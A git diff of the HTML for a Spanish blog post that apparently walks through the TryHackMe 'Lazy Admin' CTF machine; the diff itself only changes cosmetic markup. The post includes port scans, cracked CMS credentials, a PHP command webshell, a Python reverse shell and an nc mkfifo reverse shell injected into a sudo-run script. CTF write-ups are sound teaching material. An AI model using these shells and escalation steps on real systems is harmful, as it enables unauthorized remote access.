@@ -18,9 +18,9 @@
 
 <script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
 
-<script defer src="/js/helper/getParents.min.ccd45f158c1b17849307ba913a72beac239c410f2b6e648496a79842da84e55b.js"></script>
+<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
 
-<script defer src="/js/helper/fadeinout.min.9fb19682560d5fa5596fffec85da605067c4acc86aad05add4d8fff9d362a446.js"></script>
+<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
 
 <script defer src="/js/helper/closest.min.js"></script>
   
@@ -1263,7 +1263,7 @@
     <meta property="twitter:description" content="Lazy Admin es una maquina de TryHackMe, descubrimos una base de datos y una vulnerabilidad en SweetRice. Ejecutamos una shell inversa con Sudo y Perl.">
   
 
-<meta name="generator" content="Hugo 0.92.2" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1609,10 +1609,10 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/sweetrice/" class="single__tag" title="SweetRice">SweetRice</a></li>
+  <li><a href="https://sckull.github.io/tags/firefox/" class="single__tag" title="firefox">firefox</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/firefox/" class="single__tag" title="firefox">firefox</a></li>
+  <li><a href="https://sckull.github.io/tags/sweetrice/" class="single__tag" title="SweetRice">SweetRice</a></li>
   
 
 </ul>
@@ -1663,7 +1663,7 @@
 <p>Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1691,7 +1691,7 @@
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535  10.10.68.91 -e tun0
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535  10.10.68.91 -e tun0
 
 Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2019-12-12 04:49:57 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -1725,11 +1725,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h1 id="http">HTTP</h1>
 <p>Al visitar la pagina nos muestra el tipico index de apache.<br />
 <img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_22-54-16.webp" alt="image" /></p>
-<h2 id="gobuster">GOBUSTER</h2>
+<h2 id="gobuster-">GOBUSTER</h2>
 <p>Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1737,7 +1737,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t <span class="m">15</span> -w /usr/share/wordlists/dirb/common.txt 
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t <span class="m">15</span> -w /usr/share/wordlists/dirb/common.txt 
 /content <span class="o">(</span>Status: 301<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
 /index.html <span class="o">(</span>Status: 200<span class="o">)</span>
@@ -1752,7 +1752,7 @@ root@aoiri:~/tryhackme/lazyadmin#
 <p>Pasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1766,7 +1766,7 @@ root@aoiri:~/tryhackme/lazyadmin#
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t <span class="m">15</span> -w /usr/share/wordlists/dirb/common.txt 
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t <span class="m">15</span> -w /usr/share/wordlists/dirb/common.txt 
 /_themes <span class="o">(</span>Status: 301<span class="o">)</span>
 /as <span class="o">(</span>Status: 301<span class="o">)</span>
 /attachment <span class="o">(</span>Status: 301<span class="o">)</span>
@@ -1792,17 +1792,17 @@ root@aoiri:~/tryhackme/lazyadmin#
 <p>Buscamos el hash en crackstation y obtuvimos la contraseña en texto plano:</p>
 <p><img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-22-21.webp" alt="image" /></p>
 <p><strong>Credenciales:</strong></p>
-<pre tabindex="0"><code>User: manager
+<pre><code>User: manager
 Password: Password123
 </code></pre><h2 id="sweetrice-151---arbitrary-file-upload">SweetRice 1.5.1 - Arbitrary File Upload</h2>
 <p>Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (<code>lazyadmin.thm</code> en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos <code>/content/</code> a los valores que contienen <code>/as/</code> y <code>/attachment/</code>.</p>
 <p>Creamos un archivo en php de prueba:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">echo</span> <span class="s2">&#34;&lt;?php echo &#39;:D&#39;; ?&gt;&#34;</span> <span class="o">&gt;</span> <span class="nx">shellfoo</span><span class="o">.</span><span class="nx">php5</span>
+<pre class="chroma"><code class="language-php" data-lang="php">echo &#34;<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s1">&#39;:D&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span>&#34; &gt; shellfoo.php5
 </code></pre></td></tr></table>
 </div>
 </div><p>Ejecutamos y vemos que se subio nuestro archivo:</p>
@@ -1812,7 +1812,7 @@ Password: Password123
 <p>Subimos una webshell:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1823,7 +1823,7 @@ Password: Password123
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])){</span>
         <span class="k">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span>
         <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
@@ -1831,17 +1831,17 @@ Password: Password123
         <span class="k">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span>
         <span class="k">die</span><span class="p">;</span>
 <span class="p">}</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-11_23-55-24.webp" alt="image" /></p>
 <p>Ejecutamos un comando para obtener una shell inversa:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.8.1.72&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.8.1.72&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-02-45.webp" alt="image" /></p>
@@ -1853,12 +1853,12 @@ Password: Password123
 <p><strong>/home/itguy/backup.pl</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="ch">#!/usr/bin/perl</span>
+<pre class="chroma"><code class="language-perl" data-lang="perl"><span class="ch">#!/usr/bin/perl</span>
 
 <span class="nb">system</span><span class="p">(</span><span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="s">&#34;/etc/copy.sh&#34;</span><span class="p">);</span>
 </code></pre></td></tr></table>
@@ -1866,19 +1866,19 @@ Password: Password123
 </div><p><strong>copy.sh</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 192.168.0.190 <span class="m">5554</span> &gt;/tmp/f
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 192.168.0.190 <span class="m">5554</span> &gt;/tmp/f
 </code></pre></td></tr></table>
 </div>
 </div><p>El archivo <code>backup.pl</code> no puede ser modificado, pero el archivo <code>copy.sh</code> si, hicimos una pequeña prueba con un comentario en bash.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;#foo&#34;</span> &gt;&gt; /etc/copy.sh
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;#foo&#34;</span> &gt;&gt; /etc/copy.sh
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-14-17.webp" alt="image" /></p>
@@ -1887,10 +1887,10 @@ Password: Password123
 <p>Agregamos una shell inversa al archivo <strong>copy.sh</strong>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1337 &gt;/tmp/f&#34;</span> &gt; /etc/copy.sh
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1337 &gt;/tmp/f&#34;</span> &gt; /etc/copy.sh
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/LazyAdmin/Screenshot_2019-12-12_00-20-21.webp" alt="image" /></p>
@@ -2174,7 +2174,7 @@ Password: Password123
 </div>
 
 
-<script defer src="/js/swipe.min.d70095d96ef6a016133ea2c732c5d4713539d335b739178e356af46f54cf0a16.js"></script>
+<script defer src="/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3295,7 +3295,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
     </li>
     <li><a href="#http">HTTP</a>
       <ul>
-        <li><a href="#gobuster">GOBUSTER</a></li>
+        <li><a href="#gobuster-">GOBUSTER</a></li>
       </ul>
     </li>
     <li><a href="#sweet-rice-cms">Sweet Rice CMS</a>
